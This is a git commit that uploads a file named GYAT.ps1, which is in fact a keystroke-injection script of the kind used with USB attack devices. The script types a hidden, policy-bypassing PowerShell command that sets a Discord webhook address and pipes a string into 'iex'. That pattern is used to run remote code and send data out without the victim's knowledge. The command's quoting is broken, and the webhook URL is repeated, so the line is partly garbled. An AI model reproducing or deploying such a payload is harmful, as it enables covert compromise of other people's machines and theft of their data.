51bdb6712bcb3c2e8c3b71b1ae02ae1de29e232c
shotgunhacks <156491714+shotgunhacks@users.noreply.github.com>
2024-01-14 13:44:17 -0700

    Add files via upload

---
+++ GYAT.ps1
@@ -0,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://discord.com/api/webhooks/1189619569107669013/13tGAnEbnJnECdSBlh9WDpxZpMfYwhdUUv90sDcrsOXH2NOlkAmws9WA4p_HR7nAqNrB 'https://discord.com/api/webhooks/1189619569107669013/13tGAnEbnJnECdSBlh9WDpxZpMfYwhdUUv90sDcrsOXH2NOlkAmws9WA4p_HR7nAqNrB' | iex"
+ENTER
